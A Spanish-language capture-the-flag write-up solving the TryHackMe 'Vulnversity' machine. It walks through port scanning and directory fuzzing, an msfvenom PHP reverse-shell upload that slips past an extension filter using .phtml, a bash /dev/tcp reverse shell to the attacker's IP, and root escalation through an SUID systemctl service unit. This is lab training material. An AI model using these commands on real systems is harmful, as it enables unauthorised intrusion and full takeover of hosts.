---
tags:
  - Cybersecurity
  - Labs
  - TryHackMe
  - Linux
  - FileUpload
  - SUID
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#File Upload|File Upload]]
	- [[#Explotación#SUID|SUID]]

---
# Definición

> Se va a resolver una máquina (CTF), se trata de [Vulnversity](https://tryhackme.com/room/vulnversity) de [TryHackMe](https://tryhackme.com/).

---
## Enumeración
### Ping

Se realiza un *ping* para ver si tenemos conexión con la máquina, además de comprobar el sistema operativo con el que nos encontramos.

`ping -c 1 10.10.38.27`

![[Pasted image 20250706125542.png]]

*TTL=63* -> **Linux**
### Nmap

Se realiza un escaneo de puertos.

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.38.27 -oG allPorts`

![[Pasted image 20250706125738.png]]

`nmap -p21,22,139,445,3128,3333 -sCV 10.10.38.27 -oN targeted`

![[Pasted image 20250706125946.png]]
### Fuzzing Web

`http://10.10.38.27:3333/`

![[Pasted image 20250706131001.png]]

Se realiza **Fuzzing Web** para buscar directorios.

`gobuster dir -u http://10.10.38.27:3333/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`

![[Pasted image 20250706130907.png]]

`http://10.10.38.27:3333/internal/`

![[Pasted image 20250706131049.png]]

Se vuelve a realizar una búsqueda de directorios.

`gobuster dir -u http://10.10.38.27:3333/internal/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`

![[Pasted image 20250706131411.png]]

---
## Explotación
### File Upload

Se genera con *MSFvenom* un *payload malicioso* con extensión *.php*.

`msfvenom -p php/reverse_php LHOST=10.9.0.154 LPORT=444 -f raw > pwned.php`

![[Pasted image 20250706131226.png]]

Se sube el archivo, pero no está permitido esta extensión.

![[Pasted image 20250706131706.png]]

Se genera nuevamente con *MSFvenom* un *payload malicioso* con extensión *.phtml*.

`msfvenom -p php/reverse_php LHOST=10.9.0.154 LPORT=444 -f raw > pwned.phtml`

![[Pasted image 20250706131757.png]]

Se sube el archivo.

![[Pasted image 20250706131824.png]]

`http://10.10.38.27:3333/internal/uploads/`

![[Pasted image 20250706132128.png]]

Se inicia una escucha en el puerto 444, para que cuando ejecutemos el archivo realice la conexión.

`nc -nlvp 444`

![[Pasted image 20250706134849.png]]

Cuando tenemos conexión, se realiza una *reverse shell* para no perder la conexión.

`bash -c "sh -i >& /dev/tcp/10.9.0.154/445 0>&1"`

`nc -nlvp 445`

Se realiza el tratamiento de la terminal.

```
script /dev/null -c bash 
Ctrl + Z 
stty raw -echo; fg
reset xterm 
export TERM=xterm 
export SHELL=bash
```

![[Pasted image 20250706132511.png]]
### SUID

Se realiza una búsqueda de binarios **SUID** para la escalada de privilegios. 

`find / -perm -4000 2>/dev/null`

![[Pasted image 20250706132655.png]]

Se observa un permiso sospechoso: */bin/systemctl*. Se realiza una búsqueda por [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/).

![[Pasted image 20250706133737.png]]

Se accede al directorio */tmp*.

`cd /tmp/`

Se crea un archivo llamado *escalation.sh*.

`nano escalation.sh`

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod u+s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin//systemctl enable --now $TF
```

Se ejecuta el archivo.

`bash escalation.sh`

![[Pasted image 20250706133906.png]]

`bash -p`

![[Pasted image 20250706133930.png]]

---